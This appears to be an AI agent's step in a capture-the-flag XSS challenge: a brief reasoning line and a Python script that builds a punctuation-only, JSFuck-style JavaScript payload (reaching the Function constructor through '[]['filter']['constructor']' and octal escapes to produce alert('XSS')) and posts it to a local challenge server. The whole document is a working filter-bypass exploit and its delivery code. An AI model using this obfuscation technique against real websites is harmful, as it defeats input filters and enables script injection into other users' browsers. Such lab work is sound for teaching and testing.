part.text: The accepted alphabet supports JavaScript-only expression encoding. I’m generating an `alert("XSS")` function body with punctuation-only character expressions and escaped string codes.

input.content:
#!/usr/bin/env python3
import urllib.parse
import urllib.request

URL = "http://127.0.0.1:32771/page"

chars = {
    "f": "(![]+[])[+[]]",
    "a": "(![]+[])[+!![]]",
    "l": "(![]+[])[+!![]+!![]]",
    "s": "(![]+[])[+!![]+!![]+!![]]",
    "e": "(!![]+[])[+!![]+!![]+!![]]",
    "t": "(!![]+[])[+[]]",
    "r": "(!![]+[])[+!![]]",
    "u": "([][[]]+[])[+[]]",
    "n": "([][[]]+[])[+!![]]",
    "i": "([][[]]+[])[+!![]+!![]+!![]+!![]+!![]]",
    "o": "({}+[])[+!![]]",
    "c": "({}+[])[+!![]+!![]+!![]+!![]+!![]]",
}

def text(value):
    return "+".join(chars[ch] for ch in value)

def digit(value):
    if value == "0":
        return "(+[]+[])"
    return "((+!![]" + "+!![]" * (int(value) - 1) + ")+[])"

# Build the function body alert("\130\123\123"). The anonymous
# function's parser converts the octal escapes to the required XSS string.
body = (
    text("alert")
    + "+'('"
    + "+'\"'"
    + "+'\\\\'"
    + "+" + digit("1") + "+" + digit("3") + "+" + digit("0")
    + "+'\\\\'"
    + "+" + digit("1") + "+" + digit("2") + "+" + digit("3")
    + "+'\\\\'"
    + "+" + digit("1") + "+" + digit("2") + "+" + digit("3")
    + "+'\"'"
    + "+')'"
)
payload = "\";[][" + text("filter") + "][" + text("constructor") + "](" + body + ")();//"
assert all(ch in "!\"#$%&'()*+,-./:;=?@[\\]^_`{|}~" for ch in payload)
print("Payload length:", len(payload))
request = urllib.request.Request(URL, data=urllib.parse.urlencode({"name": payload}).encode())
response = urllib.request.urlopen(request, timeout=60).read().decode("utf-8", "replace")
print(response)
